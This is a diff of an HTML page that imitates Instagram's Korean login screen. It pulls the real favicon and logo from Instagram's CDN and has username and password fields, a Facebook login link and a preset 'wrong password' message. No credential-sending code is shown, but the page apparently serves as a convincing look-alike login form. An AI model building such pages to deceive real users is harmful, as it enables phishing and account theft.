@@ -3,49 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>로그인 • Instagram</title>
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico">
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
         <div class="login-box">
-            <h1 class="logo">Instagram</h1>
-            
+            <i aria-label="Instagram" role="img" style="background-image: url('https://static.cdninstagram.com/rsrc.php/v4/yd/r/5Vve--Eas3M.png'); background-position: 0px -2907px; background-size: 339px 3108px; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+
             <form id="loginForm">
                 <div class="input-wrapper">
                     <input type="text" class="input-field" placeholder=" " id="username">
                     <label class="placeholder" for="username">전화번호, 사용자 이름 또는 이메일</label>
                 </div>
-                
+
                 <div class="input-wrapper">
                     <input type="password" class="input-field" placeholder=" " id="password">
                     <label class="placeholder" for="password">비밀번호</label>
                     <button type="button" class="show-password">숨기기</button>
                 </div>
-                
+
                 <button type="submit" class="login-button">로그인</button>
             </form>
-            
+
             <div class="divider">
                 <span class="divider-text">또는</span>
             </div>
-            
+
             <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATm92me_1l_zTIPzFmnMOeg2kFn7IdEcEIxQ6aDv1z_HWCn8MnO5ggwrEyAvAL6H9LJRExowGLvwCgTEttHz-3S5HE-cT0AFvvMLnTjg3-ydl5d3OyRkJ0hZwS3CSAFwCkMZHwe6eHYdXOTYFE2Q0JGjTqk1VTohuBfLQwgmznl-fjm2EUg3qJypmfW2Sxs2unPm6muvS1Ej_a9ASwCRaHjdZUzJJXR1BqP_i3fhk8Z07Rm3xpw78YXDJt0Z_Tp3oSw6xX-7mp7DLtgsTwb5BS7AO8Jmuw7l-FlO-3F9MCig95T1ntriWV0BxtBOgcoYaBOCgOIieoerZUOK1PfCMJlanXMYufJZSJiRJnn2IJGsBi19O2uXzZ2p3EdsCndL5B605AvqjK4RF8McwonCvQF1_cUg_3TTvDjY6duX_KFkMoA0T7oyeTYSfmVCghDThjYon_Nebw" target="_blank" class="facebook-login">
                 <svg class="facebook-icon-svg" viewBox="0 0 24 24" width="20" height="20">
                     <path fill="#0095f6" d="M12 2.04c-5.5 0-10 4.49-10 10.02 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.85c0-2.52 1.49-3.92 3.78-3.92 1.09 0 2.23.2 2.23.2v2.46h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.9h-2.33v7a10 10 0 0 0 8.44-9.9c0-5.53-4.5-10.02-10-10.02z"/>
                 </svg>
                 Facebook으로 로그인
             </a>
-            
+
             <p class="error-message" id="errorMessage">잘못된 비밀번호입니다. 다시 확인하세요.</p>
-            
+
             <a href="#" class="forgot-password">비밀번호를 잊으셨나요?</a>
         </div>
-        
+
         <div class="signup-box">
             계정이 없으신가요? <a href="https://www.instagram.com/accounts/emailsignup/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fmeta_verified%2F%3Fentrypoint%3Dweb_footer%26__coig_login%3D1" target="_blank" class="signup-link">가입하기</a>
         </div>
-        
+
         <div class="footer">
             <div class="footer-links">
                 <a href="https://www.meta.com/ko-kr/about/?utm_source=about.meta.com&utm_medium=redirect" target="_blank" class="footer-link">Meta</a>
@@ -63,7 +64,7 @@
                 <a href="https://www.instagram.com/accounts/contacts_and_nonusers/" target="_blank" class="footer-link">연락처 업로드 & 비사용자</a>
                 <a href="https://www.instagram.com/meta_verified/" target="_blank" class="footer-link">Meta Verified</a>
             </div>
-            
+
             <div class="footer-bottom">
                 <div class="language-selector">
                     <select id="languageSelect">
